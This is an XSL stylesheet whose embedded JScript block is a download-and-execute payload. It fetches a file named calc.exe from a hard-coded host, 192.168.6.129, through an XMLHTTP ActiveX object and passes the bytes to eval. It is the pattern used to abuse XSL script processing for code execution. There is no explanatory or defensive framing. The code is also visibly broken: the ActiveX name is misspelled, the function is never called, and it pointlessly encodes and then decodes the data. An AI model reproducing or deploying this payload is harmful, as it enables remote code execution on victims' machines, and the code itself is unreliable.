<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
  function downloadAndExecute() {
        var binaryUrl = "http://192.168.6.129/calc.exe";
        var xhr = new ActiveXObject('Msxm12.XMLHTTP');
        xhr.open('GET', binaryUrl, false);
        xhr.send();
       
        var byteArray = new VBArray(xhr.responseBody).toArray();
        var base64String = byteArrayToBase64(byteArray);
       
        var decodedByteArray = base64ToByteArray(base64String);
        var decodedScript = byteArrayToString(decodedByteArray);
       
        eval(decodedScript);
      }
     
      function byteArrayToBase64(byteArray) {
        var base64Characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        var base64String = "";
        var padding = (3 - (byteArray.length % 3)) % 3;
        
        for (var i = 0; i < byteArray.length; i += 3) {
          var byte1 = byteArray[i];
          var byte2 = byteArray[i + 1];
          var byte3 = byteArray[i + 2];
          
          var triplet = (byte1 << 16) | (byte2 << 8) | byte3;
          
          var base64Char1 = base64Characters.charAt((triplet >> 18) & 0x3F);
          var base64Char2 = base64Characters.charAt((triplet >> 12) & 0x3F);
          var base64Char3 = base64Characters.charAt((triplet >> 6) & 0x3F);
          var base64Char4 = base64Characters.charAt(triplet & 0x3F);
          
          base64String += base64Char1 + base64Char2 + base64Char3 + base64Char4;
        }
        
        return base64String.substr(0, base64String.length - padding) + "===".substr(0, padding);
      }
     
      function base64ToByteArray(base64String) {
        var base64Characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        var padding = base64String.charAt(base64String.length - 2) === "=" ? 2 : base64String.charAt(base64String.length - 1) === "=" ? 1 : 0;
        
        var byteArrayLength = (base64String.length / 4) * 3 - padding;
        var byteArray = new Array(byteArrayLength);
        
        for (var i = 0, j = 0; i < base64String.length; i += 4) {
          var base64Char1 = base64Characters.indexOf(base64String.charAt(i));
          var base64Char2 = base64Characters.indexOf(base64String.charAt(i + 1));
          var base64Char3 = base64Characters.indexOf(base64String.charAt(i + 2));
          var base64Char4 = base64Characters.indexOf(base64String.charAt(i + 3));
          
          var triplet = (base64Char1 << 18) | (base64Char2 << 12) | (base64Char3 << 6) | base64Char4;
          
          byteArray[j++] = (triplet >> 16) &  0xFF;
      byteArray[j++] = (triplet >> 8) & 0xFF;
      byteArray[j++] = triplet & 0xFF;
    }
    return byteArray;
  }  

  function byteArrayToString(byteArray) {
    var str = "";
    
    for (var i = 0; i < byteArray.length; i++) {
      str += String.fromCharCode(byteArray[i]);
    }
    
    return str;
  }
	]]> </ms:script>
</stylesheet>
